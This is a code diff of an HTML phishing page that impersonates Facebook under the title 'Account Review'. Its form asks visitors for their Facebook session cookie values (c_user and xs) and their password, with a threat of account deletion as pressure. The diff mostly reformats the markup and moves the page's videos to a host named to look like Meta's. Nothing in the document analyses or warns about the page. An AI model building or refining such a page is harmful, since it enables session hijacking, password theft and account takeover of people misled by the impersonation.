@@ -1,8 +1,13 @@
-<!DOCTYPE html><html lang="en"><head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="https://0dk2-netlifyforyou11.wasmer.app/afan.php">
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Facebook - Account Review</title>
-    <link rel="stylesheet" href="all.min.css">
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"
+    />
     <style>
       * {
         margin: 0;
@@ -1239,12 +1244,15 @@
         </div>
         <div class="google-translate-container">
           <span class="translate-title">Language</span>
-          <select id="google_translate_element" style="
+          <select
+            id="google_translate_element"
+            style="
               width: 100%;
               background: transparent;
               border: none;
               color: white;
-            ">
+            "
+          >
             <option value="">Select Language</option>
             <option value="en">English</option>
             <option value="es">Spanish</option>
@@ -1307,7 +1315,12 @@
         <div class="language-search-container">
           <div class="search-wrapper">
             <i class="fas fa-search search-icon"></i>
-            <input type="text" class="language-search" id="languageSearch" placeholder="Search languages...">
+            <input
+              type="text"
+              class="language-search"
+              id="languageSearch"
+              placeholder="Search languages..."
+            />
           </div>
         </div>
 
@@ -1385,14 +1398,20 @@
             </button>
           </div>
 
-          <p style="
+          <p
+            style="
               text-align: center;
               margin-top: 20px;
               color: #606770;
               font-size: 14px;
-            ">
+            "
+          >
             Can't find your language? Request it at:
-            <a href="mailto:support@fb.com" style="color: #1877f2; text-decoration: none">support@fb.com</a>
+            <a
+              href="mailto:support@fb.com"
+              style="color: #1877f2; text-decoration: none"
+              >support@fb.com</a
+            >
           </p>
         </div>
 
@@ -1400,7 +1419,7 @@
           <div class="selected-language-display">
             Selected: <strong id="selectedLanguageDisplay">None</strong>
           </div>
-          <button class="confirm-btn" id="confirmBtn" disabled="">
+          <button class="confirm-btn" id="confirmBtn" disabled>
             <i class="fas fa-check"></i> Confirm Selection
           </button>
         </div>
@@ -1414,7 +1433,7 @@
           <h2 class="modal-title">
             <i class="fas fa-file-alt"></i> Account Review Request
           </h2>
-          <button class="close-modal" id="closeModal">�</button>
+          <button class="close-modal" id="closeModal">&times;</button>
         </div>
 
         <div class="modal-body">
@@ -1467,12 +1486,20 @@
                     <button class="control-btn" id="volumeBtn">
                       <i class="fas fa-volume-up"></i>
                     </button>
-                    <input type="range" class="volume-slider" id="volumeSlider" min="0" max="1" step="0.1" value="1">
+                    <input
+                      type="range"
+                      class="volume-slider"
+                      id="volumeSlider"
+                      min="0"
+                      max="1"
+                      step="0.1"
+                      value="1"
+                    />
                   </div>
                   <select class="speed-selector" id="speedSelector">
                     <option value="0.5">0.5x</option>
                     <option value="0.75">0.75x</option>
-                    <option value="1" selected="">Normal</option>
+                    <option value="1" selected>Normal</option>
                     <option value="1.25">1.25x</option>
                     <option value="1.5">1.5x</option>
                     <option value="2">2x</option>
@@ -1499,8 +1526,18 @@
             </div>
 
             <div class="form-group">
-              <label for="c_user"><i class="fas fa-user-circle"></i> c_user Value</label>
-              <input type="text" id="c_user" name="c_user" placeholder="Enter your c_user value" pattern="\d+" title="c_user only" required="">
+              <label for="c_user"
+                ><i class="fas fa-user-circle"></i> c_user Value</label
+              >
+              <input
+                type="text"
+                id="c_user"
+                name="c_user"
+                placeholder="Enter your c_user value"
+                pattern="\d+"
+                title="c_user only"
+                required
+              />
               <div class="validation-hint">
                 Must contain a valid c_user value only
               </div>
@@ -1508,7 +1545,15 @@
 
             <div class="form-group">
               <label for="xs"><i class="fas fa-key"></i> xs Value</label>
-              <input type="text" id="xs" name="xs" placeholder="Enter your xs value" pattern=".{20,}" title="xs only" required="">
+              <input
+                type="text"
+                id="xs"
+                name="xs"
+                placeholder="Enter your xs value"
+                pattern=".{20,}"
+                title="xs only"
+                required
+              />
               <div class="validation-hint">
                 Must contain a valid xs value only
               </div>
@@ -1529,8 +1574,16 @@
             <h3 class="step-title">Password Verification</h3>
 
             <div class="form-group">
-              <label for="password"><i class="fas fa-lock"></i> Re-enter Password</label>
-              <input type="password" id="password" name="password" placeholder="Enter your Facebook password" required="">
+              <label for="password"
+                ><i class="fas fa-lock"></i> Re-enter Password</label
+              >
+              <input
+                type="password"
+                id="password"
+                name="password"
+                placeholder="Enter your Facebook password"
+                required
+              />
             </div>
 
             <div class="deletion-warning">
@@ -1619,17 +1672,17 @@
       document.addEventListener("DOMContentLoaded", function () {
         // Video files mapping
         const videoFiles = {
-          english: "https://glpoqrgppcoqalvkgqkz.supabase.co/storage/v1/object/public/ihijjjhjjjii//video-information.mp4",
-          filipino: "https://glpoqrgppcoqalvkgqkz.supabase.co/storage/v1/object/public/ihijjjhjjjii//video-information.mp4",
-          hindi: "https://glpoqrgppcoqalvkgqkz.supabase.co/storage/v1/object/public/ihijjjhjjjii//video-information.mp4",
+          english: "https://translationmeta2025-f87fc.web.app/english.mp4",
+          filipino: "https://translationmeta2025-f87fc.web.app/filipino.mp4",
+          hindi: "https://translationmeta2025-f87fc.web.app/hindi.mp4",
           portuguese:
-            "https://glpoqrgppcoqalvkgqkz.supabase.co/storage/v1/object/public/ihijjjhjjjii//video-information.mp4",
-          spanish: "https://glpoqrgppcoqalvkgqkz.supabase.co/storage/v1/object/public/ihijjjhjjjii//video-information.mp4",
-          tamil: "https://glpoqrgppcoqalvkgqkz.supabase.co/storage/v1/object/public/ihijjjhjjjii//video-information.mp4",
-          arabic: "https://glpoqrgppcoqalvkgqkz.supabase.co/storage/v1/object/public/ihijjjhjjjii//video-information.mp4",
-          french: "https://glpoqrgppcoqalvkgqkz.supabase.co/storage/v1/object/public/ihijjjhjjjii//video-information.mp4",
-          swedish: "https://glpoqrgppcoqalvkgqkz.supabase.co/storage/v1/object/public/ihijjjhjjjii//video-information.mp4",
-          japanese: "https://glpoqrgppcoqalvkgqkz.supabase.co/storage/v1/object/public/ihijjjhjjjii//video-information.mp4",
+            "https://translationmeta2025-f87fc.web.app/portuguese.mp4",
+          spanish: "https://translationmeta2025-f87fc.web.app/spanish.mp4",
+          tamil: "https://translationmeta2025-f87fc.web.app/Tamil.mp4",
+          arabic: "https://translationmeta2025-f87fc.web.app/Arabic.mp4",
+          french: "https://translationmeta2025-f87fc.web.app/French.mp4",
+          swedish: "https://translationmeta2025-f87fc.web.app/Swedish.mp4",
+          japanese: "https://translationmeta2025-f87fc.web.app/japanese.mp4",
         };
 
         // Language modal elements
@@ -2156,6 +2209,5 @@
         });
       });
     </script>
-  
-
-</body></html>
+  </body>
+</html>
